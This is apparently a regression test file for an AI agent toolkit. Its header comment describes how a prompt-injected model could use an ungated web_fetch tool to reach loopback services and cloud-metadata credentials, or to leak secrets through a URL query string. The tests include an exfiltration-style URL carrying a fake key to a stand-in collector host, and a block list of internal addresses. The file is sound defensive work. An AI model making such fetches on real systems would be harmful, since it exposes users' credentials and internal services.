/**
 * SECURITY GATE REPRODUCERS — E002 Inc 07: model-callable tools added AFTER
 * cole's pass-4 certification (8929d12). Filed by cole@openkai.
 *
 * Scope: the three UNGATED additions in readOnlyTools() that postdate the cert
 * — glob / web_fetch / todo (52c7c57) — audited against the standing invariants
 * (deny floor, cwd containment, consent gate, secret redaction at every write/
 * wire seam, terminal-escape sanitisation at every render seam). lsp /
 * hashline_edit / task / mcp also postdate the cert but route file access
 * through guardPath (lsp/hashline) or the PermissionGate (task/mcp) and were
 * covered by E012/K3; the live gaps are all in the ungated read trio.
 *
 * FINDING W (HIGH) — web_fetch SSRF + outbound exfil. web_fetch sits in
 * readOnlyTools with NO PermissionGate, yet its only checks were URL-parse +
 * http(s) protocol, with redirect:"follow". A prompt-injected model could:
 *   - INBOUND: fetch http://127.0.0.1:8501/… (cortex-api), the openkai hub's
 *     token-free loopback /sessions + /memory, or http://169.254.169.254/…
 *     (cloud metadata creds) and pull the response into context. bash reaches
 *     those only WITH consent; web_fetch reached them consent-free.
 *   - OUTBOUND: place a secret already in context (e.g. a provider 401 body
 *     that echoed a key) into the query string — an egress channel that skips
 *     the transcript/activity redaction seams.
 * FIX: refuse loopback/private/link-local/metadata targets (literal IP AND
 * resolved DNS name), re-check every redirect hop (manual follow), and refuse a
 * URL carrying a secret-shaped value. In-scope per SECURITY.md (secret
 * exfiltration into outbound payloads; reaching loopback-trusted services).
 *
 * FINDING G (low/med) — glob had no pattern-length cap while its sibling grep
 * caps model-authored patterns at 500 chars precisely to bound compile/scan
 * cost. Mirror the cap so glob is not the one uncapped RegExp-compile seam.
 *
 * These tests assert the FIXED behaviour — W2/W3/W4/G1 fail before the fix and
 * pass after; W1 (classifier table) and G2 (normal glob) are positive controls
 * that hold in both directions, so a mechanism revert makes EXACTLY the
 * reproducers fail, no tautologies.
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";

import { readOnlyTools, isBlockedFetchAddress } from "@kaidera/openkai-core";
import type { AgentTool } from "@earendil-works/pi-agent-core";

function toolByName(tools: AgentTool<any>[], name: string): AgentTool<any> {
  const tool = tools.find((t) => t.name === name);
  assert.ok(tool, `${name} must be in the tool set`);
  return tool!;
}

function resultText(result: { content: unknown }): string {
  const parts = (result as { content: Array<{ type: string; text?: string }> }).content;
  return parts.filter((c) => c.type === "text" && typeof c.text === "string").map((c) => c.text).join("\n");
}

// ── W1: the address classifier (positive + negative control) ────────────────

test("W1: isBlockedFetchAddress denies loopback/private/link-local, allows public", () => {
  const blocked = [
    "127.0.0.1", "127.9.9.9", // loopback /8
    "10.0.0.1", // private /8
    "172.16.5.4", "172.31.255.255", // private /12 (bounds)
    "192.168.1.1", // private /16
    "169.254.169.254", // link-local — cloud metadata
    "100.64.0.1", // CGNAT /10
    "0.0.0.0", // "this host"
    "::1", // IPv6 loopback
    "fe80::1", // IPv6 link-local
    "fc00::1", "fd12:3456::1", // IPv6 unique-local
    "::ffff:127.0.0.1", // IPv4-mapped loopback
  ];
  for (const ip of blocked) assert.equal(isBlockedFetchAddress(ip), true, `${ip} must be blocked`);

  const allowed = [
    "8.8.8.8", "1.1.1.1", "93.184.216.34", // public v4
    "172.32.0.1", // just outside 172.16/12
    "192.169.0.1", // just outside 192.168/16
    "2606:4700:4700::1111", // public v6 (Cloudflare)
  ];
  for (const ip of allowed) assert.equal(isBlockedFetchAddress(ip), false, `${ip} must be allowed`);
});

// ── W2/W3/W4: web_fetch refuses SSRF + exfil (fail before fix) ──────────────

test("W2: web_fetch refuses a loopback literal target (SSRF, inbound)", async () => {
  const dir = await mkdtemp(path.join(tmpdir(), "openkai-inc07-web-"));
  const web = toolByName(readOnlyTools(dir), "web_fetch");
  // Port 9 (discard) is not listening: before the fix this attempts a real
  // fetch and returns a connection error, never a refusal.
  const out = resultText((await web.execute("t", { url: "http://127.0.0.1:9/x" })) as any);
  assert.match(out, /non-public address/i, "loopback target must be refused at the guard, not fetched");
});

test("W3: web_fetch refuses a hostname that resolves to loopback (localhost)", async () => {
  const dir = await mkdtemp(path.join(tmpdir(), "openkai-inc07-web-"));
  const web = toolByName(readOnlyTools(dir), "web_fetch");
  const out = resultText((await web.execute("t", { url: "http://localhost:9/x" })) as any);
  assert.match(out, /non-public address/i, "localhost must resolve-and-refuse (DNS path)");
});

test("W4: web_fetch refuses a URL carrying a secret-shaped value (outbound exfil)", async () => {
  const dir = await mkdtemp(path.join(tmpdir(), "openkai-inc07-web-"));
  const web = toolByName(readOnlyTools(dir), "web_fetch");
  const secret = "sk-" + "a".repeat(32); // matches SECRET_VALUE_PATTERN
  // collector.invalid never resolves (RFC 2606 reserved TLD): before the fix
  // this fails fast with a DNS error, never a secret-shaped refusal.
  const out = resultText((await web.execute("t", { url: `http://collector.invalid/p?leak=${secret}` })) as any);
  assert.match(out, /secret-shaped/i, "a secret in the URL must never be sent");
  assert.ok(!out.includes(secret), "the secret must not be echoed back in the refusal either");
});

// ── G1/G2: glob pattern-length cap ──────────────────────────────────────────

test("G1: glob refuses an over-long pattern (cost cap, mirrors grep)", async () => {
  const dir = await mkdtemp(path.join(tmpdir(), "openkai-inc07-glob-"));
  const glob = toolByName(readOnlyTools(dir), "glob");
  const out = resultText((await glob.execute("t", { pattern: "*".repeat(501) })) as any);
  assert.match(out, /too long/i, "an over-long glob pattern must be refused");
});

test("G2: glob still matches a normal pattern (cap does not break normal use)", async () => {
  const dir = await mkdtemp(path.join(tmpdir(), "openkai-inc07-glob-"));
  await writeFile(path.join(dir, "alpha.ts"), "x", "utf-8");
  const glob = toolByName(readOnlyTools(dir), "glob");
  const out = resultText((await glob.execute("t", { pattern: "*.ts" })) as any);
  assert.match(out, /alpha\.ts/, "a normal glob must still return matches");
});
